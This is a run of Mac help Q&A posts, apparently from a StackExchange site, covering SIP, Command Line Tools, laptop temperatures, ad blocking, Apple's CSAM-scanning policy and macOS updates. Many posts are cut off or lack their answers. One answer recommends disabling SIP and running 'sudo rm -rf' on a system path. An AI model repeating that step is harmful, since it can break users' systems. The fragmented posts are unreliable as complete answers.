just try to think of them as either 'on' or 'off', with Close and Quit doing the same thing.\n\nA: Command-M is what you need. This \"minimises\" the window, rather than \"closing\" it.\nThis is the same as clicking the orange button at top left of the window.\n", "Q: How can I get more items in pop-up list of recent projects of Dock icon in VSCode?

There would not have been any builds available of kubectl 1.10 for the M1 chip when it was made - and I don't think it is likely that anyone would be producing builds for public usage for several year old versions of kubectl for the M1.\nYou will simply have to download the source code for the 1.10 version and compile it yourself. You might experience that it won't compile or that it won't work when compiled - in that case you'll have to backport fixes for the M1 support from the newer releases to the 1.10 release.\nYou can download the source code from here:\nhttps://github.com/kubernetes/kubernetes/archive/refs/tags/v1.10.13.tar.gz\nYou can build the source code in two ways.

The used disk is an external SSD with an USB 3.0 port.\n\nA: Time Machine encryptions happens on the client. It is the Mac that is responsible for the encryption when you (on the Mac) have chosen to make encrypted backups.\nThe fact that you store the backups on an encrypted ext4 disk just means that the data is encrypted once more. This doesn't give you \"double security\" or anything like that, but it also doesn't hurt anything.\nThe difference in speed would most likely be negligible. There is some overhead involved in encrypting the data of course, but the network connection for the Raspberry Pi is probably going to be the bottleneck. Any reasonably modern Mac won't have problems encrypting data for that transfer speed, and they do it without any really noticeably slowdown.\n", "Q: Uninstalling Command Line Tools manually in Big Sur Homebrew seemed to have installed Command Line Tools when I was trying ntfs-3g on Big Sur.

I have restored the folder and xcode-select -p now points to that folder again.\nThis older question for pre-Big Sur versions of Mac points out that I should check pkgutil; did so and pkgutil --pkgs shows that the receipts are still there.

You’ve already done the uninstallation, but the system to track structured package installs thinks all the files are still installed, prompting the update message since you don’t have the updated tools anymore on the drive.\nThe process of removing these BOM files is not not normal but still the next logical step for you despite your characterization of it as an “utterly terrible idea”\n\nSo I booted into recovery mode, disable SIP, moved all files from that folder that had com.apple.pkg.CLTools in their name, and the update in the App Store went away. Then I booted into recovery again to enable SIP\n\nIf you had a second Mac, you could save the dance of disabling and enabling SIP by putting your Mac in target disk mode and using another macOS computer to attempt removal of the BOM files\nYou also could do an erase install and restore from a backup only your apps and user data onto a clean system that hasn’t gotten the receipts out of sync with the installed developer tools.\n\nA: remove /Library/Developer/CommandLineTools directory\nApple Technical Note TN2339\n", "Q: Pressing left Option key shows the Desktop I am using my first MacBook, MacBook Air 2020 with an M1 chip.\nEverything was going normal, but I realized today when I click the left option  key it shows the Desktop.

Rename as desired.

I am troubleshooting some issues with my 5GHz SSID. The Wi-Fi module on my ISP modem crashes, knocking down all SSIDs, 2.4 and 5GHz. Both will reappear but devices cannot connect to the 5GHz, only 2.4. My tv error message says it's an authentication error but will fail after putting in the correct passphrase. If I reset the Wi-Fi module on the modem it will work, after putting in the passphrase.\nWhat I am trying to do is identify the exact point where the process breaks by using the wifi diagnostics. I ran the diagnostics and unzipped the file and there is a ton of information.\nWhich files should I be concentrating on, without going on a needle/haystack search?\n\nA: I don't think any of the files in there will help you debug such an issue.\nInstead you could use a WiFi-sniffer in order to capture what's actually sent back and forth. However, be prepared to spend a lot of time on it - without any promise of actually being able to fix this yourself, as bugs in ISP modems are usually not fixable by customers.\nI would consider buying a separate WiFi access point and disable WiFi in the ISP-supplied equipment.\n", "Q: How to delete a system file as an admin I am an \"admin\" user on a Mac running Big Sur. I am trying to remove a symlink:\n$ ls -al /usr/bin/python\nlrwxr-xr-x  1 root  wheel  75 Jan  1  2020 /usr/bin/python -> ../../System/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7\n\nNow, I tried removing it with sudo but I get permission denied:\n$ sudo rm /usr/bin/python\nrm: /usr/bin/python: Operation not permitted\n\nHow do I assume actual admin power on my mac? Do I need to be added to the \"wheel\" group?\nPlease note, I am well aware of workarounds with shell aliases as outlined here:\nUnable to upgrade to python 3.6 from python 2.7\nBut that would only be a work around. I want to know what the root cause is, and what I can do about it.\n\nA: The root cause here is that the /usr/bin directory is protected by SIP (System Integrity Protection). Therefore noone, even admin users, can change the contents of the directory while SIP is active.\nThe system folders on Big Sur are actually contained on a separate, cryptographically signed file system (system volume) that is mounted read-only at boot. Its contents is mixed into your normal read-write mounted file system through the use of so called firmlinks. This means that it looks and feels like it used to do on older versions of macOS - everything is in the right place so to speak - but in actual fact the system files cannot be changed during normal system operation.\nIn theory, you could disable SIP, mount the system volume as writable, change the python link and re-sign the whole thing. However, I would strong discourage that as you would risk breaking Apple-supplied tools that depend on the specific python version - and you would probably have to fight a never-ending battle where the link is restored during macOS upgrades.\nInstead I would advise you to either use a different name for the program (i.e. for example python3 instead of python) - or using an alias in your shell so that \"python\" really runs a differently named program.\n\nA: Reading the comments, the answer to the larger, not explicitly asked question of “What has Apple done to secure the OS and also allow developers to overlay versions of command-line tools to do their work?”\nIf you have that question: the best writing in the evolution of command line relevant changes from Mojave to Catalina to Big Sur is here:\n\n*\n\n*https://eclecticlight.co/2020/06/25/big-surs-signed-system-volume-added-security-protection/\nThe first half-dozen paragraphs lay out clearly what is up and will help greatly anyone looking to customize a modern macOS system.\nThe signed and read-only system volume will break many old guides and answers since some traditional unix assumptions are no longer valid (like the need to be root or what an admin might do to modify system files in general).\n\nA: You can issue the:\ncsrutil disable\ncommand to disable System Integrity Mode (SIM).\nthen, while in recovery mode stil:\nsudo rm -rf /target\nDisabling SIM is generally frowned upon and I recommend learning about it before following up with this strategy. I decided to go ahead and do it and am satisfied with the result.\n", "Q: Disable Spaces shelf in Mission Control all windows Exposé In recent versions of macOS, Mission Control's all windows view shows a shelf for your Spaces. When first activated, this shelf is collapsed at a small height at the top of the screen that displays each Space's title. If you move your mouse up and hover over that shelf, the shelf expands in height and a full thumbnail of each Space is shown.\n\nMission Control activated via a Bottom Left or Bottom Right hot corner; note the collapsed-by-default Spaces shelf:\n\n\nThe problem is that I use a \"Top Right\" hot corner to activate Mission Control, and have since that feature was released as Exposé in OS X 10.3 in 2003. Because that hot corner is located above that collapsed shelf, the Spaces shelf is fully expanded every time I use the hot corner. The collapsed view is never shown.\n\nMission Control activated via a Top Left or Top Right hot corner; Spaces shelf always expanded:\n\n\nI would like to keep using the same hot corner due to muscle memory. But I don't use Spaces, so I would like to remove that space-wasting and Exposé-spatial-layout-wrecking expanded Spaces shelf.\n\n*\n\n*Can the Spaces shelf be disabled and hidden entirely from the Mission Control all windows view, for all activation methods? This would be like using old Exposé, before it was expanded to Mission Control.\n\n*Using a Top Left or Top Right activation hot corner for Mission Control, is there any way for the Spaces shelf to not be immediately displayed upon every activation? I wouldn't mind still seeing the collapsed view, but I want to expand the shelf intentionally by click or moving out and re-hovering.\n\n\nA: You can remove any numbered Space by hovering over it with your cursor, then clicking the X,\n\nThis only applies to user-created, numbered Spaces. Any created by using fullscreen are named not numbered & behave differently.\nI'm not absolutely certain this will prevent the large shelf from showing, as it may retain the 'add new Space' icon at the right.

I have no additional OS, its just pure macOS installed on a single partition.\nYesterday I was doing some regular work, then left my MacBook Pro running and walked away for a few minutes.

So all of a sudden it restarted and was not booting anymore.\nI tried booting in Recovery Mode and running Disk Utility, I could only see the physical disk, no partitions underneath.

There are many possible explanations I could offer but it won't do any good trying to root-cause right now. The only priority is to save your data.\nIf you have a recent backup of your data, you can stop reading now. Go format your drive, restore from your backup, and then carefully monitor your system for further misbehavior because something like this is often the result of hardware failure and can easily reoccur.\nIf you don't have a backup, your situation becomes a lot less pleasant.\nThere are no readily available tools that I know of which will recover your data in a straightforward fashion. My go-to tool for filesystem repair, DiskWarrior, doesn't have APFS support. But even if it did, as far as the system is concerned, there is no filesystem on your drive. The 2TB partition just looks like free space.\nBut - presumably - the bulk of your filesystem actually remained intact after the failure sequence, and the corruption is likely localized to a critical region of your disk. What this means is that a heuristic scavenging algorithm can probably identify and recover a large portion of your data.\nI'm only aware of one service that has the capabilities to recover your data from an APFS volume: DriveSavers. And they ain't cheap. So now the question becomes: How much is your data worth to you?\n(If you are going to attempt to rescue your data, immediately turn off and do not power up again your computer! Every second that the drive is receiving power, there is an increased opportunity for further corruption.)\n", "Q: Macbook Keeps disabling my Keyboard I have a Das Keyboard X50Q and as of late it will randomly go dark and no longer seem to have power going to it.

In the past, that trick changed the four icons of resolution size to a list of all possible resolutions, with many more than four choices.\nIs there some way to access that list of all possible resolutions in Big Sur?\n\nA: For external displays, holding the Option key while selecting Scaled still brings up the list of resolutions.

Such a victim might then be targeted by law enforcement, similar to the well-known Swatting attack.\nApple does not talk about this in their post, so:\nHow can an Apple user, with an iCloud account for legitimate use, mitigate such a CSAM flooding attack?\nIs there a way to \"reject\" such a crafted message in the first place, without even storing the offending image on the device? Would it make a difference when a \"non-Apple\" Messenger is receiving images, like WhatsApp or Instagram, instead of iMessage?\n\nA: There's no attack to mitigate really as the premise behind the attack is flawed.\nApple's new CSAM detection will work in iCloud Photos - not in iCloud Messages. Someone sending you CSAM as a swatting attack will not trigger the CSAM detection. It doesn't matter if it is sent by Apple Messages, Facebook Messenger, WhatsApp or Instagram.\nIf you, the user, decides that you want to keep the CSAM you have been attacked with and start saving it to iCloud Photos - instead of reporting it to the authorities - then you have a problem.

I didn't found any information about instalation or downloading it and tried brew install darwinup already.\n\nA: Building Darwin from source is quite different now that Apple has discontinued that tool.\n\nThe technical problem is that the darwinup utility is not compatible with the security requirements of Big Sur and later macOS versions, so it's longer distributed as part of macOS — and it's not safe to use on current macOS versions even if you have the utility.\n\n\n*\n\n*Where is darwinup to install SimpleAudioDriver in command line script?\nUnfortunately, unless you can work on older versions of macOS, engineering your tool chain to use other tools may be your next move.

Note that this will collect stuff that, to human understanding, is not part of a word; for instance, “My (somewhat) flawed, short answer” will be split into the units “My”, “(somewhat)”, “flawed,”, “short” and “answer”.\nIsolating grammatical words, OTOH, is not something Shortcuts supports out of the box, as it needs actual language analysis (don‘t try to solve that problem with a regular expression, lest you end up having two problems).\n", "Q: Running two apps side by side with preferences?

I used switches from Star Tech before and they seem to work well enough.  https://www.startech.com/en-us/server-management/kvm-switches\nI mention them only because I have used them before and have no real experience with any others.  I found out that they are often cheaper if bought through a third party vendor than if bought direct, so shopping around can save money.  There's other brands of course, so shop around.\nThere's some exceptions but for the most part all KVM switches will switch like for like.  That is they will have connect to the computers by USB-A, PS/2, or whatever for keyboard and mouse, then connect by HDMI or whatever for video, then have ports to match for connecting the display, keyboard, and mouse.\nWhatever the case the first thing to do is decide what ports the keyboard, mouse, display, and whatever else will need.  I suspect USB-A and DisplayPort or HDMI.  Then comes to finding the adapters for both computers to get to that point.  I was able to find a USB-C \"microdock\" with HDMI, 2x USB-A, USB-C power pass-through, and some other bits, for about $40.  An old Macbook with Thunderbolt 2 likely already has those ports, and if not then it's a matter of one or two $10 adapters.\nNow that both computers are using the same ports then it's a matter of picking a KVM switch to suit your budget and tastes.  A two-way KVM switch with integrated cables tends to be pretty low cost.  Total outlay will likely be around $200, for the switch and adapters, by my estimates.\nI do recall seeing KVM switches built to pair a desktop with a USB-C laptop and so will have the single point USB-C attachment on one side but a more traditional USB-A, HDMI/DP/whatever, etc. for the desktop side.  If you can find on of those that might suit you, but not likely to save money.  There's at least one device that might be called a \"dual host dock\" that has all kinds of bells and whistles for someone that wants to plug in two laptops.  Again this will be pricy, and may not be compatible with both of your computers.\nMy guess is you will have a fairly common USB-A keyboard, USB-A mouse, and a common display with HDMI and DP inputs.  Perhaps the cheapest and easiest way to deal with this is just get a nice KVM that suits your keyboard, mouse, and display then get whatever adapters you need to plug it in.  It sounds like you might have a pair of laptops like my own.  I needed nothing to plug in one laptop and a cheap USB-C \"microdock\" for the other.  It's a bit of a cable clutter but it works.\n", "Q: How can I prevent file association from resetting: .R <> RStudio I would like to open .R files with RStudio on Mac.

Is there a list of requirements?\nmany thanks\n\nA: The TestFlight App Review (for external best testing) can be seen as a slightly lighter version of the App Store review process. It is still the same guidelines, but the testing might not be as thorough - and it seems in my experience that they have a higher tolerance for \"known bugs\".\nJust because the app was approved for App Store release does not mean that it is automatically approved for external beta testing as well. Apple seems to review the app once more. Typically you would have different app executables in the review queue for the app store release and beta testing, so in the common case there's no \"rework\" involved.\nNote also that with betas it seems the app only gets manually reviewed on the first submission. Subsequent test versions are usually approved after only an automated testing. Note that some times a manual review takes place again, but it is occurs very infrequently in my experience.\nI assume that Apple requires the app to go through the manual TestFlight App Review, even though it is already App Store approved, in order to save various information about your app that it uses for subsequent automatized reviews.\nYou can find the list of requirements for the review process here:\nhttps://developer.apple.com/app-store/review/guidelines/\nNote that the guidelines apply equally to the App Store review as well as the TestFlight App Review.\n", "Q: Changed /etc/fstab, now stuck in login I changed the /etc/fstab file on my MacOS X Catalina in order to be able to write to NTFS hard drives.

I am scared that it might break my MacBook. I cleaned the MacBook screen and stuff but every time I do something on it, it instantly heats up very high. Should I be concerned or is this normal(that I doubt)?\nMacBook:\n\n*\n\n*Apple - MacBook Pro - 13\" Display with Touch Bar\n\n*Intel Core i5\n\n*16GB Memory\n\n*512GB SSD\n\n*Space Gray\n\n\nA: You can look up the CPU specs here on Intel's website, but the maximum temperature allowed at the processor die (Tjunction) for the i5-1038NG7 (which may be your CPU) is 100 °C.\nHere is a description (from Intel) of what the Tjunction max temperature means:\nWhat is Tjunction max temperature?\n\nTjunction max is the maximum thermal junction temperature that a\nprocessor will allow prior to using internal thermal control\nmechanisms to reduce power and limit temperature. Activation of the\nprocessor's thermal control system may cause performance loss as the\nprocessor typically reduces frequency and power to prevent\noverheating. The goal for a system builder or a do-it-yourself (DIY)\nend user is to design a platform configuration that keeps the\nprocessor under the Tjunction max threshold during heavy workloads to\nmaximize performance of the system.\n\nI suspect that your machine is fine, as thermal throttling should occur at the CPU level as needed. Also from the Intel Support site:\nCould my processor get damaged from overheating?\n\nIt's unlikely that a\nprocessor would get damaged from overheating, due to the operational\nsafeguards in place. Processors have two modes of thermal protection,\nthrottling and automatic shutdown. When a core exceeds the set\nthrottle temperature, it will reduce power to maintain a safe\ntemperature level. The throttle temperature can vary by processor and\nBIOS settings. If the processor is unable to maintain a safe operating\ntemperature through throttling actions, it will automatically shut\ndown to prevent permanent damage.\n\nYou can download the Intel Power Gadget and monitor the temperature your CPU is attaining under load to have a better idea of what is happening. While running under load, you can visually see the thermal throttling occurring - the Power utilization, Frequency, and Temperature will fluctuate when running a consistent high load.\nFWIW, I can get my machine up to 96-97 °C by running a load test (code is below). I increased the number of parallel processes to 16 (on an 8-Core Intel i9), though it is 4 in the below bash shell code fragment.\nfor i in {1..4}\ndo\n        yes > /dev/null &\ndone\n\n\nA: Honestly, I think this is normal. My MacBook Air often goes over 95 °C when using Blender, building on Roblox Studio, or any other CPU-intensive things.\n\nA: Though this is normal, it can be scary and/or lead to thermal throttling.\nTo prematurely spin up the fan (for example, at 70 °C), you can use Macs Fan Control, found here.

How can I block ads in macOS Safari 14 on Big Sur without installing any ad blocker extensions?\n\nA: Consider using a DNS based Ad Blocker if you don't want to install anything on the machine itself.  For example, AdGuard provides free DNS servers that block ads.  You can configure MacOS to connect to that DNS server, and benefit from ad blocking without installing anything.\nAdGuard DNS:  https://adguard.com/en/adguard-dns/overview.html\n\nA: You can use the /etc/hosts file to block ad servers.\nPre-configured lists are available at https://github.com/StevenBlack/hosts and other sources.\n\nA: You can't. Safari does not have any built-in ad blocking technology, apart from blocking pop-ups.\nAs far as I know, no browser comes with ad blockers preinstalled. Since no ad blocker is ever going to be perfect, requires a lot of maintenance, and may even have legal implications, I doubt it's something a browser vendor wants to invest into.\n", "Q: What adblock extension works on macOS Safari?

It also includes videos and photos that are not managed by your photo library (for example, an image that a friend shares with you using AirDrop).\n\n*iCloud Drive: Contains all files stored in iCloud Drive. It may also contain files in your Desktop and Documents folders if you store them in iCloud Drive.\n\n*iOS Files: Contains iOS backups and firmware.\n\n*TV, Music, Books, and Podcasts: Each app category contains purchases from that specific app, which can be removed from your Mac and downloaded again.\n\n*Mail: Contains emails and attachments.\n\n*Messages: Contains content from Messages conversations, including attachments.\n\n*Music Creation: Contains content from GarageBand, Logic, and MainStage.\n\n*Photos: Contains your System Photo Library.\n\n*Trash: Contains items you deleted (items deleted from iCloud Drive are not included in the amount of storage space).\n\n*Other Users: Contains files created and modified by other user accounts on your Mac.\n\n*Other: Contains files that don’t fall into the categories listed here. This category primarily includes files and data used by the system, such as log files, caches, VM files, and other runtime system resources. Also included are temporary files, fonts, app support files, and plug-ins. You can't manage the contents of this category. The contents are managed by macOS, and the category varies in size depending on the current state of your Mac.\n\n*System: Contains macOS system applications and files. Examples include Mail, Terminal, Calculator, and Time Machine Local Snapshots.\n\nThere's still an additional category that you can come across:\n\n\n*Developer: Contains Xcode caches, project build data and indexes and SDKs.\n\n", "Q: Touching apple screen with finger nail I saw this small dirt mark on my MacBook Air screen, and decided to clean it with a microfibre cleaning cloth. However when I went to clean it I may have pressed to a hard, because a ripple effect appeared.\nI think I used my nail to get the small dirt mark off, however the microfibre cleaning cloth was in between the screen and the nail. I know this is a bit over protective but will any harm be caused by the small extra amount of force I put?\n\nA: It's unlikely you caused any damage.  The screens are fairly flexible.\nIf you aren't seeing any visible damage, or issues with the display in the area you cleaned it, you're okay.\n", "Q: Does macOS Photos have a QR code reader built in somehow, does it decode codes in images? I just imported a group of photos from my iPhone to Photos in macOS and the application \"hiccuped\" twice at the point where it read in two images of complicated QR-codes.\n\"hiccuped\" = sort-of flashed another window that was too fast to see, or at least redrew the screen.\nIf Photos somehow detects a QR code and processes it to store the results for searching or indexing, I suppose that might explain it.\nPhotos 5.0, macOS 10.15.7\n\nA: QR code detection and reading does not involve any sort of \"extra window\", \"screen redrawing\" or the like. The fact that many QR code reader apps for example display photos with boxes in bright colors drawn on them, etc. does not mean that such display is actually a necessary part of the process.\nI have never heard of Photos having a QR code scanning functionality. It does not use QR codes to index photos.\nIf you want to read QR codes with your iPhone, you can use the Camera app. It will by default detect and read QR codes.\nMaybe you feel that the Photos app is hiding something from you, and that you suspect that QR-codes in your photos are getting \"scanned\" nefariously?\nYour grounds for suspicion for that is that you saw something \"flashing\" or \"redrawn\" while importing photos. As mentioned above, QR-code scanning does not require any kind of on screen display, graphics or flashing of any kind.\nIt is most probably just a random occurence that Photos happened to be a bit slower changing from one photo to the other there. Scanning a QR-code in a photo can be done in milliseconds - it's not something that require Photos to pause between photos. In addition, indexing of photos for searching (i.e. the stuff Photos does to make it possible for you to search for locations, features in photos, etc. - as in for example searching for mountains or cat) happens in the background after photos have been imported.\nIn addition to this, what would Apple gain by \"nefarisouly\" scanning your photos for QR-codes - I cannot see anything. I guess you could search for \"photos with QR-codes\" in them - but besides that, what kind of secret feature would it be for? It simply doesn't make sense.\nYes, it is ofcourse possible that evil programmers at Apple hid a QR-code scanning feature in Photos that extracts all those very interesting QR-codes we all have lying around (like routing information on that UPS packages that was delivered 2 months ago, the link to that web page with video instructions on how to assemble the IKEA furniture you've bought last year, etc) - and seemingly not doing anything with that information. However, there's really no practical way of determining if that is the case.\nYou could conduct a very thorough analysis of the involved binaries, which includes a enormous code base of system frameworks.  It's not practical.\n", "Q: The word \"box\" isn't in /usr/share/dict/words I was testing some code that I wrote to solve the New York Times' \"Letter Boxed\" game. The other day, it was giving results that included compound words containing \"box\" (e.g., \"icebox\"), but not the word \"box\" itself.\nAt first, I thought there was a bug in my code. However, I checked /usr/share/dict/words and -- lo and behold -- \"box\" isn't in there. According to the README file alongside the word list, this is from FreeBSD, circa 1993.\nIs this intentional, or just an honest omission? What other common words are missing from this file? Has FreeBSD conceded to the existence of boxes in the last ~30 years, even if Apple hasn't?\n\nA: From /usr/share/dict/README\n\nWelcome to web2 (Webster's Second International) all 234,936 words worth.\nThe 1934 copyright has lapsed, according to the supplier.  The\nsupplemental 'web2a' list contains hyphenated terms as well as assorted\nnoun and adverbial phrases.  The wordlist makes a dandy 'grep' victim.\n\nSo \"box\" wasn't part of the list the file is based an. This page implies that modern use started with World War II which would explain why it was not included in an earlier dictionary.\nFor an updated list you may want to look at any of the Linux packages providing a similar file (see https://unix.stackexchange.com/questions/33488/where-can-i-download-the-usr-dict-packages for a list of sources).\n\nA: \"Box\" isn't in the /usr/share/dict/words file because it's an incomplete word list with unclear provenance or criteria, unmaintained and of legacy value only. It has been distributed with BSD-derived open-source Unix distributions for years: here is the changelog from FreeBSD going back to 1994, and here to 1985, although I believe that history to not be complete. You'll note that the README author, James A Woods of NASA Ames, uses a UUCP bang-path notation for his email address, dating this to the 1980's.\nIt's missing a number of valid words including \"began\", \"fauna\", \"safer\", and \"women\"; its claim to be derived from 1936 Webster's doesn't explain these.\n", "Q: Does Apple have a public policy on what it will allow governments to scan their citizen's iPhones for? Apple announced that the iPhone will soon scan photos on the device to look for nefarious content. As users update their iOS, this feature will soon be on all 1bn+ iPhones in every country1.\nThe first use of this new feature is to scan photos of US iPhones for child sexual abuse material (CSAM). But it isn't clear what future uses it has, particularly outside the US, and especially in countries whose governments are not tolerant of political dissent, LGBTQ, women's rights, and other \"illegal\" activities.\nQuestion\nHas Apple released a policy paper detailing how it will work with governments to decide what to scan for, and if there are any limits it places on what Governments can request that Apple scan for?\nExample\nSuppose a meme was created mocking a Russian or Chinese political leader; and the respective governments asked Apple to scan iPhones for that meme to find out who else may have shared it or even who created it - is there some policy document available so we can know in advance whether Apple would automatically comply?\n1 On iPhones using iOS15 and which back up photos to iCloud (~85% of all iPhones).\n\nA: The CSAM scanning is not being done by a government agency.  Apple is working with The National Center for Missing & Exploited Children, a private non-profit group.\nIn their recently released Expanded Protections for Children, Frequently Asked Questions paper, Apple stated:\n\nQ: Could governments force Apple to add non-CSAM images to the hash list?\n\n\n\nA: No. Apple would refuse such demands and our system has been designed to prevent that from  happening.  We have faced demands to build and deploy government-mandated changes that degrade the privacy of users before, and have steadfastly refused those demands. We will continue to refuse them in the future. Let us be clear, this technology is limited to detecting CSAM stored in iCloud and we will not accede to any government’s request to expand it.\n\nWith regard to scanning as indicated in your meme example, Apple only refers to their privacy policy regarding when they'll work with local governments on accessing a user's data.\nAs laws vary in each country, a person would need to reference their country's privacy policy to determine what rights they have in relation to their government.  It's not possible to point to a single comprehensive policy that covers everyone.\n\nA: As of today, 8 Dec 2022, Apple abandoned its plans to scan users photos for CSAM material:\n\nThe tool was meant to be privacy-preserving and allow the company to flag potentially problematic and abusive content without revealing anything else. But the initiative was controversial, and it soon drew widespread criticism from privacy and security researchers and digital rights groups who were concerned that the surveillance capability itself could be abused to undermine the privacy and security of iCloud users around the world.\n\n\nAt the beginning of September 2021, Apple said it would pause the rollout of the feature to “collect input and make improvements before releasing these critically important child safety features.” In other words, a launch was still coming. Now the company says that in response to the feedback and guidance it received, the CSAM-detection tool for iCloud photos is dead.\n\n", "Q: How can I download an earlier version of an app to my macOS on the App Store? I’m using an app that I have download from the App Store on my Mac OS. After updating it to it’s latest version recently, it doesn’t seem to have worked very well on my MacBook.\nAn earlier version worked perfectly well and I want to download and install that particular version back. But I can’t seem to download an older version on App Store. The download button in AppStore only allows me to get the latest version.\nIs there anyway I can download an older version of an app on App Store? Otherwise, how else can I do that if it’s not through App Store?\n\nA: There's no option to download older versions of apps on the Mac App Store.\nDepending on the app in question, you might be able to find an older version of said app on the vendor's web site or on downloads sites in general.\n\nA: In my case, I decided to re-purchase the app and just get the new version. But when I finally approved the purchase, the AppStore gave me a notification that it wouldn't charge me because it detected that I owned an older version of the same app.\nThis was for the app Moom purchased on the AppStore.\n", "Q: Photos: Import All New Items doesn't work I have over 30,000 photos on my iPhone 8 Plus.

It switched me to the Imports tab, but now new items would import. Clicking back on the Device tab, the progress bar was not moving and I only had the option to \"Stop Import\".\nMy Mac had fairly low disk space.\nI deleted some items and emptied the Trash.\nThen pressed \"Import All New Items\" again and it immediately started importing items.\n\n\nA: I would try using Image Capture on your Mac to bring the Photos over from your iPhone.\n\nA: Try using an original Apple Lightning cable instead of a third-party cable.\n", "Q: What can I do to let someone test my MacBook Pro without going through my stuff I was contacted by a potential buyer who seems interested in my MacBook Pro 2019, they will probably like to test it to see how it is and stuff, that it is fine, the thing is before selling if they decide to buy it I have to format it, if I do it before we meet then they cannot test it, and if they decide to back off then I have to reinstall everything.\nWhat can I do to make it so that they can test it without going through /mess up my stuff/files ?\n\nA: An easy way to accomplish this would be enable Guest login.\nThis way, your potential buyers can test out the computer without going through any of your personal data.\nTo enable Guest user login, go to System Preferences app → Users & Groups, click on Guest User and check Allow guests to log in to this computer\n\n", "Q: Why am I always asked to install Command Line Developer Tools when already installed?

Both would be the same file, the same program.\nHowever, that is ofcourse different when you run macOS on a case-sensitive file system.\nI assume the Xcode developers at one point had considered this and installed a stub at both cc and CC on case-sensitive file systems, so that an attempt to invoke either compiler would show the prompt. Then later someone made it so that when the Xcode command line tools are actually installed, they only install the cc file, and not the CC file.\nIf you are an Apple registered developer, you can use Feedback Assistant to report this bug to Apple.\nIf you are not, then you can use the general feedback page to notify Apple about the problem.\n", "Q: Can a Mac app set the desktop image?

I travel a lot (pre-covid) and when I'm on a flight and it is dark it is really hard to type in my password at login because the keyboard isn't lit.\nIs there a way to change the settings so that the keyboard is lit during login?\n\nA: If you have FileVault enabled, the login screen at boot and hibernation resume is actually drawn by EFI, not macOS - macOS is not yet running at that point. Because EFI is a constrained environment, it does not include a driver for the keyboard illumination controller. So there is no way to light the keyboard until you've logged in and EFI continues on to load macOS, which does contain the driver you need.\nYou have two options:\n\n*\n\n*Disable FileVault so that you boot directly into macOS (not recommended!).\n\n*Don't shut down your system and instead either put it to sleep shortly before your flight or change your hibernation delay via pmset (see man pmset for details) so that the system stays in S3 sleep and doesn't enter hibernation prior to the time you need to use it.\n\n", "Q: Advice on AppleScript syntax for adding Apple Mail.app message URL into Calendar.app With a Calendar.app Event open and the cursor in the URL field I can select the Services menu and run this script.

Why is what saying differently?\n\nA: /bin/sh is a wrapper that forwards to another shell. If the link /private/var/select/sh is present, the shell pointed to by this link is started. Otherwise, one of fallbacks (bash, dash, or zsh) is executed.\nSo if your /private/var/select/sh points to /bin/bash, that's what eventually gets executed when you run /bin/sh --version.\nSee also man sh where this is described.\nIt seems this wrapper is indeed from the dash project (or at least Apple's version; couldn't find the source they're using), which is why what reports dash-11.\n\nA: When you run what, the program looks through the binary /bin/sh searching for a specific text pattern. This specific text pattern was put there by a source code revision control system named SCCS, that is used to keep track of changes to source code. The idea was that SCCS automatically updated a text string within the source code to contain a version marker that would then end up in the finished program. The what command could then be used to figure out which version of the source code that was used for building a specific binary.\nToday, SCCS is considered ancient - being designed in the early 70s and not is not really used by anyone anymore (except perhaps for software archaeology). Therefore you can commonly find that programs that contain code dating back a long while might have such a text pattern inserted decades ago that hasn't been updated since or requires manual updating.\nBasically you cannot really be sure that what outputs something that is actually \"true\".\nIn particular case it is so that sh is often a reduced version of a shell program (in comparison to for example a full blown bash shell). For example on the Mac I'm using right now, sh is 31 kB binary, where for example bash comes in at 609 kB and dash at 108 kB.\nIt is common to see that sh is a stripped down version of some other shell, or only a \"bare-bones\" shell. It is also common to see that other shells, such as for example bash offers a mode where they can be used to replace sh by simulating a simpler shell. In addition you can have a small, simple sh that calls out to a larger shell binary (like bash) when complexity is needed.\nEarlier on macOS, sh was basically just bash run in compatibility mode. However, bash is a quite large program. On the other hand dash can also function as a simple sh shell, and is more light-weight. In order to get compatibility between versions, you can have dash simply respond to --version as bash would have done, behave like sh would have done - all while being a dash binary.\n", "Q: Is there a macOS Big Sur dock icon mockup or generator to get custom rounded icons?

If we want the apostrophe we need to do ´, then space.\nApparently on normal US layout on a Mac (same on Windows and Linux without the US international layout), we need to use combination of Option + ´ then the letter:\n Option + ´ then e = é\n Option + ´ then c = ç\n Option + ˋ then e = è\n Option + ˋ then a = à\n Option + \" then e = ë\n …\n\nBut after searching on the internet, this behaviour appears to be reserved to the English International keyboard.\nThe question is could we do the same on a US Keyboard?\n\n*\n\n*Open System Preferences > Keyboard > Input Sources\n\n*Add U.S. International PC\n\n\nIn that image we can see that select the US International PC layout that permit it represent an ISO QWERTY Intl and not an ANSI QWERTY US.\nQWERTY US (ANSI)\n\nQWERTY Intl (ISO)\n\nThe question is witch keyboard should I choose when I order my Mac, to have the expected behaviour?\n\nA: You can choose whichever you prefer…\nAdding US International PC as your input method will apply to either an ANSI or ISO keyboard, with almost the same results.\nI would choose based on where you expect keys such as ` ~ § ± to be, as they move between the two physical layouts - ANSI has a 'missing' key left of Z compared to ISO, which will force your grave accent up to the very top left key, rather than next to Z.\n\nSo, the input source will adapt to whichever physical keyboard you use. This is British & US International on a UK English keyboard…\n\n\nBoth input methods also contain the standard Mac dead-keys on  Opt ⌥ \n\n", "Q: Good alternative to Adobe Photoshop Adobe products have always been the bane of my Mac existence, and lately they seem to have gotten even worse (notably running multiple processes in the background constantly accessing my keychain and connecting to the internet without being explicitly launched).\nAs near as I can tell there is no way to avoid this, so I need a good alternative app. A paid app is fine. As close as possible to Photoshp's feature set would be nice, but I do not do professional image work, but mostly basic web design elements and tweaking of photos.\n\nA: There is an online photo editor known as Photopea.

Downloading a Software Update via the built in mechanism is ridiculously slow:\n\nMy internet connection isn't the fastest, but not that slow either. Furthermore, this Software Update seems to be implemented very badly. If there is a problem, any problem, the whole download is trown away and needs to be initiated again from the start:\n\nIdeally I would like to download the update via the Bittorrent protocol and verify its integrity with a checksum provided by Apple. I doubt that that's possible though. Is there any other way to download software updates for MacOS?\n\nA: Firstly, don't use BitTorrent to get Apple updates.  The risk that they have been compromised is too high.  You should always get updates from Apple.\nBefore Big Sur, Apple provided updates for download at Support Downloads.  So, download once and update one or more Macs was possible.\nWith Big Sur, Apple stopped providing downloadable updates. You now have this choice (which you may not like):\n\n*\n\n*Let the Mac download and install the update (2 to 3 GB) on each Mac - as you have been doing. And, yes, you may need to start again if there are any problems.\n\n\n*Download the complete macOS (12.5 GB).  Save a copy in case of install problems before using the complete macOS install to update you Mac.\nWhere to get macOS?\nMrMacintosh has a page dedicated to the downloads of complete macOS for Big Sur.  Note carefully that the links he 